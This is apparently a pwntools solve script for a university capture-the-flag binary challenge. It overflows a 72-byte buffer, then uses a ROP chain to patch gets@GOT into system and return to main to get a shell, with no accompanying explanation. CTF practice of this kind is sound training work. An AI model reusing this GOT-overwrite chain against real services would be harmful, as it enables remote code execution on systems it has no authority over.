from pwn import *

HOST = 'cyberchallenge.disi.unitn.it'
PORT = 9105
OFFSET = 72

#take a look for atol

context.terminal = ["konsole", "-e"]

breakpoint = "0x0000000000401191"
breakpoint1 = "0x0000000000401186"

# r = remote("cyberchallenge.disi.unitn.it", 9202)
r = remote(HOST, PORT)
# r = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# r = gdb.debug(
#     "./bin",
#     f"""
#     break *{breakpoint}
#     break *{breakpoint1}
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"},
# )

elf = ELF("./bin")
libc = ELF("./libc.so.6")

system_offset = libc.symbols["system"] - libc.symbols["gets"]
log.info(f"System offset: {hex(system_offset)}")

gets_got = elf.got["gets"]
log.info(f"gets@got: {hex(gets_got)}")

main = elf.symbols["main"]
log.info(f"main: {hex(main)}")

# 0x000000000040119b: add dword ptr [rax], ebx; ret;
# 0x0000000000401196: pop rax; ret;
# 0x0000000000401198: pop rbx; ret;

add_rax_ebx = p64(0x000000000040119b)
pop_rax = p64(0x0000000000401196)
pop_rbx = p64(0x0000000000401198)

offset = 72

system_payload = b"/bin/bash\x00"

payload = b" " * (offset - len(system_payload)) + system_payload

packer = make_packer(64, endian="little", sign="signed")

payload += pop_rax
payload += p64(gets_got)
payload += pop_rbx
payload += packer(system_offset)
payload += add_rax_ebx

# call the main function
payload += p64(main)

r.sendline(payload)
r.interactive()